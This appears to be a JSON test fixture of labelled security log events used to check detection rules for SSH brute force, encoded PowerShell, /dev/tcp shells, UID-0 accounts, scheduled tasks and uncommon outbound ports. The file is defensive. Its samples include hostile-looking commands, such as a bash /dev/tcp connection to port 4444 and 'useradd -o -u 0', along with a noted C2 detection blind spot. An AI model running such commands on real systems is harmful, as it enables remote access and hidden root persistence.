@@ -1,0 +1,348 @@
+[
+  {
+    "id": "ssh-brute-force-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:00Z edge-01 sshd[1200]: Failed password for analyst from 192.0.2.45 port 51000 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:01Z edge-01 sshd[1201]: Failed password for analyst from 192.0.2.45 port 51001 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:02Z edge-01 sshd[1202]: Failed password for analyst from 192.0.2.45 port 51002 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:03Z edge-01 sshd[1203]: Failed password for analyst from 192.0.2.45 port 51003 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:04Z edge-01 sshd[1204]: Failed password for analyst from 192.0.2.45 port 51004 ssh2"
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "ssh-brute-force-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:00Z edge-01 sshd[1200]: Failed password for analyst from 192.0.2.45 port 51000 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:01Z edge-01 sshd[1201]: Failed password for analyst from 192.0.2.45 port 51001 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:02Z edge-01 sshd[1202]: Failed password for analyst from 192.0.2.45 port 51002 ssh2"
+      },
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:00:03Z edge-01 sshd[1203]: Failed password for analyst from 192.0.2.45 port 51003 ssh2"
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "powershell-encoded-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "sysmon",
+        "sensor": "sysmon-01",
+        "payload": {
+          "EventID": 1,
+          "UtcTime": "2026-11-15 09:02:00",
+          "Computer": "workstation-07",
+          "User": "forge\\morgan",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGQAZQBtAG8A",
+          "RecordID": "1001"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "powershell-encoded-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "C:\\Windows\\powershell.exe",
+          "command": "powershell -File inventory.ps1"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "shell-unusual-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "auditd",
+        "sensor": "audit-01",
+        "host": "edge-01",
+        "payload": "type=SYSCALL msg=audit(1794733380.123:800): success=yes uid=1001 auid=1001 euid=1001 exe=\"/bin/bash\"\ntype=EXECVE msg=audit(1794733380.123:800): argc=3 a0=\"bash\" a1=\"-c\" a2=\"echo demo >/dev/tcp/192.0.2.9/4444\""
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "shell-unusual-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "/bin/bash",
+          "command": "bash -c uptime"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "scheduled-task-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "workstation-07",
+          "kind": "process",
+          "process": "C:\\Windows\\System32\\schtasks.exe",
+          "command": "schtasks /create /tn LabTask /tr notepad.exe /sc onlogon",
+          "user": "forge\\morgan"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "scheduled-task-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "C:\\Windows\\schtasks.exe",
+          "command": "schtasks /query"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "account-uid-zero-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "edge-01",
+          "kind": "process",
+          "process": "/usr/sbin/useradd",
+          "command": "useradd -o -u 0 lab-admin",
+          "user": "analyst"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "account-uid-zero-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "/usr/sbin/useradd",
+          "command": "useradd -u 1002 developer"
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "sudo-shell-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash"
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "sudo-shell-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "linux_auth",
+        "sensor": "auth-01",
+        "payload": "2026-11-15T09:04:00Z edge-01 sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/id"
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "outbound-port-positive",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "zeek",
+        "sensor": "zeek-01",
+        "host": "workstation-07",
+        "payload": {
+          "ts": 1794733500,
+          "uid": "Cdemo01",
+          "id.orig_h": "10.0.0.7",
+          "id.resp_h": "1.1.1.1",
+          "id.resp_p": 4444,
+          "proto": "tcp",
+          "orig_bytes": 620
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "outbound-port-negative",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "zeek",
+        "sensor": "zeek-01",
+        "host": "workstation-07",
+        "payload": {
+          "ts": 1794733500,
+          "uid": "Cdemo01",
+          "id.orig_h": "10.0.0.7",
+          "id.resp_h": "1.1.1.1",
+          "id.resp_p": 443,
+          "proto": "tcp",
+          "orig_bytes": 620
+        }
+      }
+    ],
+    "reason": "Rule contract fixture"
+  },
+  {
+    "id": "authorized-encoded-admin",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "sysmon",
+        "sensor": "sysmon-01",
+        "payload": {
+          "EventID": 1,
+          "UtcTime": "2026-11-15 09:02:00",
+          "Computer": "workstation-07",
+          "User": "forge\\morgan",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGQAZQBtAG8A",
+          "RecordID": "1001"
+        }
+      }
+    ],
+    "reason": "Authorized encoded PowerShell produces a known false positive"
+  },
+  {
+    "id": "authorized-task-maintenance",
+    "suspicious": false,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "workstation-07",
+          "kind": "process",
+          "process": "C:\\Windows\\System32\\schtasks.exe",
+          "command": "schtasks /create /tn LabTask /tr notepad.exe /sc onlogon",
+          "user": "forge\\morgan"
+        }
+      }
+    ],
+    "reason": "Approved task creation produces a known false positive"
+  },
+  {
+    "id": "powershell-file-evasion",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "synthetic",
+        "sensor": "fixture",
+        "payload": {
+          "timestamp": "2026-11-15T09:00:00Z",
+          "host": "lab-01",
+          "kind": "process",
+          "process": "C:\\Windows\\powershell.exe",
+          "command": "powershell -File untrusted.ps1"
+        }
+      }
+    ],
+    "reason": "Malicious file execution without monitored arguments is outside coverage"
+  },
+  {
+    "id": "https-c2-blindspot",
+    "suspicious": true,
+    "events": [
+      {
+        "source": "zeek",
+        "sensor": "zeek-01",
+        "host": "workstation-07",
+        "payload": {
+          "ts": 1794733500,
+          "uid": "Cdemo01",
+          "id.orig_h": "10.0.0.7",
+          "id.resp_h": "1.1.1.1",
+          "id.resp_p": 443,
+          "proto": "tcp",
+          "orig_bytes": 620
+        }
+      }
+    ],
+    "reason": "HTTPS C2 is not detected by the uncommon-port heuristic"
+  }
+]
